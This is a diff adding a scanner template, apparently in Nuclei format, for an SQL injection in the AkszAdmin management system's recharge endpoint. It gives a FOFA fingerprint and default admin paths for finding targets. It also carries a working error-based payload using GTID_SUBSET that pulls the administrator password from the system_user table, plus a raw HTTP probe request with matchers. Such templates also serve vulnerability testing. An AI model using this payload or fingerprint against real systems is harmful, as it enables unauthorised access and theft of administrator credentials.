@@ -1,0 +1,40 @@
+id: akszadmin-disk-admin-sql
+
+info:
+  name: "AkszAdmin 管理系统 index 接口 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: /static/wap/css/common.css
+          默认后台: /akszadmin  /admin
+          管理员密码：
+      type=GTID_SUBSET(CONCAT((SELECT MID((IFNULL(CAST(password AS NCHAR),0x20)),1,190) FROM `fast`.`system_user` ORDER BY username LIMIT 0,1)),9985)&money=1222
+  tags: AkszAdmin
+
+http:
+- raw:
+  - |
+    POST /index/user/dorecharge HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
+    Content-Type: application/x-www-form-urlencoded
+    Cookie: think_var=hk; s47696c33=mp6s4pmvbpa4nqluhbdr7d3pvc
+    Upgrade-Insecure-Requests: 1
+
+    type=GTID_SUBSET(CONCAT((SELECT (VERSION()))),2235)&money=1222
+  matchers-condition: and
+  matchers:
+    # 1. 匹配包含 "GTID"
+    - type: word
+      part: body
+      words:
+      - 'GTID'
+    
+    # 2. 匹配不包含 "_SUBSET"（通过 negative: true 实现反向匹配）
+    - type: word
+      part: body
+      words:
+      - '_SUBSET'
+      negative: true
